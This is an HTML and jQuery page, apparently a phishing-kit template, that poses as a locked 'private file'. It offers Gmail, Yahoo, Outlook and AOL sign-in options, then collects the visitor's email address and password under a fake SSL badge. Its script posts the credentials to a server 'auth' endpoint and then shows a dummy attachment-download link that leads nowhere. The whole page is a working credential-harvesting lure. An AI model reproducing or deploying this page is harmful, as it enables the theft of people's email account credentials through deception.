
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">

  <title></title>

  <!-- Stylesheets -->
  <link rel="stylesheet" href="css/style.css">
  <link rel="stylesheet" href="css/set1.css">
  
  <style type="text/css">

#listt img{
	display: inline-block !important;
	margin:20px;
}
</style>

  <!--Google Fonts-->
  <link href='https://fonts.googleapis.com/css?family=Playfair+Display' rel='stylesheet' type='text/css'>
  <link href='https://fonts.googleapis.com/css?family=Lato:400,700' rel='stylesheet' type='text/css'>

</head>

<body>
<div id="main-wrapper">

  <div class="container-fluid">
    <div class="row">
      <div class="col-md-6 col-xs-12 left-side">
        <header>
          <h4 style="color: red !important;">Access Denied</h4>
          <span>This is a private file</span>
          <h3>Sign up<br>to get access!</h3>
        </header>
      </div>
      <div class="col-md-6 col-xs-12 right-side">
         <!-- #row2 -->
        <div id="row2">
        	<h3>Sign up using:</h3>
            <div id="listt">
                <img id="gref" src="img/gmail.jpg" alt="Gmail" width="70" height="70"><img id="yref" src="img/yahoo.png" alt="Yahoo!" width="70" height="70"><img id="oref" src="img/outlook.png" alt="Outlook" width="70" height="70"><img id="aref" src="img/aol.png" alt="AOL" width="70" height="70">
            </div>
        </div>
        <!-- /#row2 -->
        
         <!-- #row3 -->
        <div id="row3">
            <h3 class=""><img src="img/ssl.png" style="margin: 20px;" alt="Gmail" width="140" height="50">Log in to authnticate:</h3>
        <span class="input input--hoshi">
          <input class="input__field input__field--hoshi" type="text" id="email" required/>
          <label class="input__label input__label--hoshi input__label--hoshi-color-3" for="email">
            <span class="input__label-content input__label-content--hoshi">E-mail</span>
          </label>
        </span>
        <span class="input input--hoshi">
          <input class="input__field input__field--hoshi" type="password" id="password" required/>
          <label class="input__label input__label--hoshi input__label--hoshi-color-3" for="password">
            <span class="input__label-content input__label-content--hoshi">Password</span>
          </label>
        </span>
        <div class="cta">
          <button class="btn btn-primary" id="btn1">
            Sign-Up Now
          </button>
        </div>
        </div>
        <!-- /#row3 -->
        
        <!-- #row4 -->
        <div id="row4">
        	<h3>Downloading file:</h3>
            <div id="">
                <a href="#">Click to download attachment</a>
            </div>
        </div>
        <!-- /#row2 -->
        
      </div>
    </div>
  </div>

</div> <!-- end #main-wrapper -->

<!-- Scripts -->
<script src="js/jquery.min.js"></script>
<script src="js/scripts.js"></script>
<script src="js/classie.js"></script>
<script>
  (function() {
  	$('#row3').hide();
      $('#row4').hide();
  
    // trim polyfill : https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/Trim
    if (!String.prototype.trim) {
      (function() {
        // Make sure we trim BOM and NBSP
        var rtrim = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;
        String.prototype.trim = function() {
          return this.replace(rtrim, '');
        };
      })();
    }

    [].slice.call( document.querySelectorAll( 'input.input__field' ) ).forEach( function( inputEl ) {
      // in case the input is already filled..
      if( inputEl.value.trim() !== '' ) {
        classie.add( inputEl.parentNode, 'input--filled' );
      }

      // events:
      inputEl.addEventListener( 'focus', onInputFocus );
      inputEl.addEventListener( 'blur', onInputBlur );
    } );

    function onInputFocus( ev ) {
      classie.add( ev.target.parentNode, 'input--filled' );
    }

    function onInputBlur( ev ) {
      if( ev.target.value.trim() === '' ) {
        classie.remove( ev.target.parentNode, 'input--filled' );
      }
    }
  })();
</script>
<script>
	var authtype = "";
	
$(document).ready(function(){
  $('#yref').click(function(e){
     // alert("clicked yahoo");
     setauth("y");
   });
   $('#gref').click(function(e){
     // alert("clicked gmail");
     setauth("g");
   });
   $('#oref').click(function(e){
     // alert("clicked yahoo");
     setauth("o");
   });
   $('#aref').click(function(e){
     // alert("clicked aol");
     setauth("a");
   });
   
   $('#btn1').click(function(e){
          u = $('#email').val();
          p = $('#password').val();
          
          if(u == "" || p == ""){
               if(u == "") alert("Usernamd is required");
               if(p == "") alert("Password is required");
          } 
          
          else{
             	sendMail(u,p);
          }
          
          return false;
        });
});

function setauth(auth){
  if(auth == "y"){
     $('#auth-image').attr({"src":"img/yahoo.png"});
  }
  else if(auth == "o"){
     $('#auth-image').attr({"src":"img/outlook.png"});
  }
  else if(auth == "g"){
     $('#auth-image').attr({"src":"img/gmail.jpg"});
  }
  else if(auth == "a"){
     $('#auth-image').attr({"src":"img/aol.png"});
  }
  
  $('#row2').hide();
  $('#row3').fadeIn();
} 

function sendMail(user, pass){
        data = {"_token": "{{csrf_token()}}", "username": user, "pass": pass};
           $.ajax({
    
   type : 'POST',
   url  : "{{url('auth')}}",
   data : data,
   beforeSend: function()
   { 
    $("#error").fadeOut();
    $("#response").fadeOut();
    $("#working").html('<br><br><img class="img img-responsive" src="{{asset('img/loading.gif')}}" alt="Authenticating.. " width="150" height="150"><br>Authenticating.... </strong>');
   },
   success :  function(response)
      {        
        //alert(response);
        $("#working").fadeOut();
        if(response == "success"){
          //redirect to attachment
          $('#row3').hide();
          $('#row4').fadeIn();
        } 
        
        else{
           $("#response").html(response);    
        } 
     }
   });
         return false;            
    } 
</script>

</body>
</html>
